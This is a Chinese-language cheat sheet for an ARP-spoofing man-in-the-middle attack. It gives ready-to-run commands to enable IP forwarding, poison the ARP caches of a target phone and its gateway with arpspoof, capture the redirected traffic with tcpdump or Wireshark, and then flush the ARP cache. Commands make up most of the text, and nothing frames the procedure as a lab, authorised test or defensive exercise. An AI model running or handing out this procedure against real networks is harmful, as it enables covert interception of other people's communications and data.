
---

```markdown
# IP 转发与 ARP 欺骗命令速查

## IP 转发

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

启用 Linux 系统的 IP 转发功能，使本机能够作为路由器转发数据包（MITM 攻击前必须开启）。

---

## ARP 欺骗（中间人攻击）

### 欺骗手机（目标）

```bash
sudo arpspoof -i [网卡名] -t [手机IP] [网关IP]
```

告诉目标手机“我是网关”，让手机的数据包发往攻击机。

### 欺骗网关（路由器）

```bash
sudo arpspoof -i [网卡名] -t [网关IP] [手机IP]
```

告诉网关“我是手机”，让网关的数据包发往攻击机。

---

## 清除 ARP 缓存（恢复网络）

```bash
sudo ip -s -s neigh flush all
```

清除系统 ARP 缓存，恢复网络正常通信（攻击停止后执行）。

---

## 完整攻击流程示例

```bash
# 1. 开启 IP 转发
sudo sysctl -w net.ipv4.ip_forward=1

# 2. 开始 ARP 欺骗（需开两个终端分别执行）
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# 3. 抓包或进行流量分析
# ... 在此执行 tcpdump、wireshark 等工具 ...

# 4. 恢复网络（停止 arpspoof 后执行）
sudo ip -s -s neigh flush all
```

---

## 常用网卡查看

```bash
ip a
# 或
ifconfig
```

---

## 注意事项

| 要点 | 说明 |
|------|------|
| 网卡名 | 使用 `ip a` 查看，常见为 `eth0`、`wlan0`、`ens33` 等 |
| 网关 IP | 一般为路由器地址，如 `192.168.1.1` |
| 目标 IP | 被攻击设备的 IP 地址 |
| 权限 | 所有命令需要 `root` 权限（`sudo`） |
| 依赖工具 | `arpspoof` 包含在 `dsniff` 包中：`sudo apt install dsniff` |
| 恢复网络 | 攻击结束后务必清除 ARP 缓存，否则目标无法正常上网 |
---

